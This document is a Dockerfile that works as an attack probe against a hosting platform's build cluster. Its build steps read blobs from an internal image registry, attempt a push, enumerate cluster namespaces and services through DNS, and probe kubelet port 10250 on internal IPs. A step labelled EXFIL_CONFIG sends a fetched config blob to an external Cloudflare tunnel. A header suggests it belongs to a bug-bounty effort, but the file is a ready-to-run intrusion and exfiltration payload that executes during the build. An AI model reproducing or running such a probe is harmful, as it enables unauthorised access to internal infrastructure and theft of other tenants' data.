FROM python:3.11-slim
RUN apt-get update && apt-get install -y curl dnsutils && rm -rf /var/lib/apt/lists/*

RUN echo "=== CONFIG BLOB PROBE START $(date -u) ==="

RUN echo "=== CONFIG_BLOB ===" && \
    curl -s -m 15 http://docker-cache.docker-cache.svc.cluster.local:5000/v2/digitaloceanapps/apps-run/blobs/sha256:e1803861c100cf53e45734320d3c381c32a66026f93b8578390a4d8a251775bc 2>&1 | base64 && echo ""

RUN echo "=== SMALL_LAYER_BLOB ===" && \
    curl -s -m 15 http://docker-cache.docker-cache.svc.cluster.local:5000/v2/digitaloceanapps/apps-run/blobs/sha256:d65b40aadcf5d94ea6eb35cbe53b66398de7cb24f7baaa0e7c39236d6a532b94 2>&1 | base64 && echo ""

RUN echo "=== PUSH_TEST ===" && \
    curl -s -m 10 -X PUT \
    -H "Content-Type: application/vnd.docker.distribution.manifest.v2+json" \
    http://docker-cache.docker-cache.svc.cluster.local:5000/v2/test-push-probe/manifests/test 2>&1 | base64 && echo ""

RUN echo "=== REGISTRY_API_CHECK ===" && \
    curl -s -m 10 -I http://docker-cache.docker-cache.svc.cluster.local:5000/v2/ 2>&1 | base64 && echo ""

RUN echo "=== NS_DISCOVERY ===" && \
    for ns in kube-system monitoring istio-system ingress-nginx cert-manager logging observability build default; do \
        result=$(nslookup -type=SRV _http._tcp.${ns}.svc.cluster.local 2>&1 | grep -c "service ="); \
        echo "${ns}:srv_count=${result}"; \
    done | base64 && echo ""

RUN echo "=== KUBE_DNS_ZONE ===" && \
    nslookup -type=ANY cluster.local 2>&1 | base64 && echo "" && \
    nslookup -type=ANY svc.cluster.local 2>&1 | base64 && echo ""

RUN echo "=== GRAFANA_MANIFEST ===" && \
    curl -s -m 10 -H "Accept: application/vnd.docker.distribution.manifest.v2+json" \
    http://docker-cache.docker-cache.svc.cluster.local:5000/v2/grafana/otel-lgtm/manifests/latest 2>&1 | base64 && echo ""

RUN echo "=== BUILDKIT_SVC ===" && \
    nslookup buildkitd.build.svc.cluster.local 2>&1 | base64 && echo "" && \
    nslookup registry.build.svc.cluster.local 2>&1 | base64 && echo ""

RUN echo "=== NODEPORT_SCAN ===" && \
    for ip in 10.245.0.2 10.245.0.3 10.245.0.4 10.245.0.5; do \
        result=$(curl -s -m 2 -o /dev/null -w "%{http_code}" http://${ip}:10250/pods 2>&1); \
        echo "${ip}:10250=${result}"; \
    done | base64 && echo ""

RUN echo "=== EXFIL_CONFIG ===" && \
    config=$(curl -s -m 15 http://docker-cache.docker-cache.svc.cluster.local:5000/v2/digitaloceanapps/apps-run/blobs/sha256:e1803861c100cf53e45734320d3c381c32a66026f93b8578390a4d8a251775bc 2>&1 | base64) && \
    curl -s -m 10 -X POST -H "Content-Type: text/plain" -H "X-BBP-Researcher: mrunal" \
    -d "${config}" \
    "https://cheapest-vessel-hometown-equipped.trycloudflare.com/config-blob-exfil" 2>&1

RUN echo "=== CONFIG BLOB PROBE END $(date -u) ==="

RUN mkdir -p /app && echo '<html><body>probe</body></html>' > /app/index.html
CMD ["python3", "-m", "http.server", "8080"]
